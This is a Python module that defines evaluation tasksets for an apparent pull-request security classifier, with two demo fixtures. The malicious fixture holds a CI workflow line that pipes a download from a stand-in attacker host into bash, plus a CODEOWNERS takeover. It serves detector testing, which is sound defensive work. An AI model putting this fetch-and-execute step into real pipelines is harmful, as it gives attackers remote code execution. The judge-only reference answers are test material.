"""Eval tasksets — the change PAYLOAD the planner sees + the concrete reference only the judge sees.

That split is ATLAS's fuzzy-vs-concrete design. diff-sentry's planner classifies a CHANGE (a webhook-style
payload — repo/kind/number/author/title/body/files); so a task carries a `change` dict the `run` subcommand
ingests (`diff_sentry.event_from_payload` → the normalized untrusted content the planner sees), plus the
judge-only `reference` — the concrete expected classification (the correct verdict + why) consumed ONLY by
the eval judge, never shown to the planner. It is non-machine-checkable by design — a change admits nuanced
reads, so there is no gold label; the judgement is deferred to the LLM judge exactly as the paper does.

Runs pair to tasks by the `run_id == task id` convention. `demo_taskset()` is a tiny built-in set for the
offline `score --stub` path (paired against synthetic or recorded traces). Pure stdlib + pydantic — no
diff_sentry import (the `run` subcommand ingests the change).
"""

from __future__ import annotations

import json

from pydantic import BaseModel, Field


class EvalTask(BaseModel):
    """One eval task: id (pairs a run to its task via `run_id == task id`), the `change` PAYLOAD the PLANNER
    sees (ingested by the `run` subcommand into the normalized untrusted content), and the judge-only
    reference.

    `change` is optional: the `score` subcommand can grade EXISTING traces with only `id` + `reference`
    (the planner-visible change falls back to the run's `run_start` meta). The `run` subcommand REQUIRES
    `change` (it ingests it to drive a real classification)."""

    id: str
    change: dict = Field(default_factory=dict,
                         description="the change payload the `run` cmd ingests (repo/kind/number/files…); the planner sees it")
    reference: str = Field("", description="concrete expected CLASSIFICATION, JUDGE-ONLY (never shown to the planner)")


def load_taskset(path: str) -> list[EvalTask]:
    """Load a taskset JSON: a list of {id, change?, reference?} objects (or {"tasks": [...]})."""
    with open(path, encoding="utf-8") as fh:
        raw = json.load(fh)
    if isinstance(raw, dict):
        raw = raw.get("tasks")
    if not isinstance(raw, list):
        raise ValueError("taskset JSON must be a list of {id, change?, reference?} objects")
    tasks: list[EvalTask] = []
    for i, item in enumerate(raw):
        if not isinstance(item, dict) or not item.get("id"):
            raise ValueError(f"taskset item {i} must be an object with a non-empty 'id' field")
        change = item.get("change", {})
        if not isinstance(change, dict):
            raise ValueError(f"taskset item {i}: 'change' must be an object (a webhook-style change payload)")
        tasks.append(EvalTask(id=str(item["id"]), change=change, reference=str(item.get("reference", ""))))
    ids = [t.id for t in tasks]
    dupes = sorted({i for i in ids if ids.count(i) > 1})
    if dupes:
        raise ValueError(f"duplicate task ids in taskset: {dupes}")
    return tasks


def demo_taskset() -> list[EvalTask]:
    """A tiny built-in set — the offline fixture that proves the score→aggregate→report pipeline with the
    stub judge and zero creds. The changes are deliberately compact; the references are judge-only, and
    cover both poles: a clearly MALICIOUS CI-injection change (must be caught + signal) and a plainly BENIGN
    docs change (must NOT be over-flagged), so a judge/scorecard exercises both regimes."""
    return [
        EvalTask(
            id="demo-malicious-ci",
            change={
                "repo": "acme/widgets", "kind": "pull_request", "number": 7, "author": "drive-by-42",
                "title": "Add CI helper",
                "body": "Small workflow tweak.",
                "files": [
                    {"filename": ".github/workflows/ci.yml", "status": "modified", "additions": 2,
                     "deletions": 0,
                     "patch": "+      - run: curl -sSfL http://evil.example/x | bash\n"},
                    {"filename": "CODEOWNERS", "status": "modified", "additions": 1, "deletions": 0,
                     "patch": "+* @drive-by-42\n"},
                ],
            },
            reference="(1) VERDICT: malicious — a CI workflow gains a `curl … | bash` remote-exec step and "
                      "the same PR reassigns CODEOWNERS to the author (self-approval of future changes); "
                      "(2) TECHNIQUES: curl-pipe-shell / ci-shell-injection + codeowners-tamper; "
                      "(3) EVIDENCE: high/critical indicator hits on the shell fetch + the CODEOWNERS "
                      "change → a SIEM signal MUST fire; (4) a benign verdict here is a false-negative.",
        ),
        EvalTask(
            id="demo-benign-docs",
            change={
                "repo": "acme/widgets", "kind": "pull_request", "number": 8, "author": "alice",
                "title": "Fix typo in README",
                "body": "Docs only.",
                "files": [
                    {"filename": "README.md", "status": "modified", "additions": 1, "deletions": 1,
                     "patch": "-teh quick brown fox\n+the quick brown fox\n"},
                ],
            },
            reference="(1) VERDICT: benign — a one-line README typo fix, no executable/workflow/ownership "
                      "surface touched; (2) NO indicators should fire and NO SIEM signal; (3) marking this "
                      "suspicious/malicious is over-flagging (paranoia), NOT a correct catch.",
        ),
    ]
